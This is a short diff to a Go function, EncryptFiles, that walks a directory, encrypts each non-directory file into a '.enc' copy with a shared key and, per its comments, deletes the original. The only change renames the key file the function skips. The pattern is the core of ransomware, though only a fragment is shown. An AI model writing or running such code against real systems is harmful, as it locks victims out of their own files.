@@ -97,7 +97,7 @@ func EncryptFiles(dir string, sharedKey string) {
 		// If error reading, return err
 		if err != nil { return err }
 		// If file is not a directory and is not the key
-		if !info.IsDir() && !strings.Contains(path, "aesKey"){
+		if !info.IsDir() && !strings.Contains(path, "key.aes"){
 			// Encrypt the file using shared key, appending .enc
 			EncryptFile(path, path + ".enc", sharedKey)
 			// Remove unencrypted file
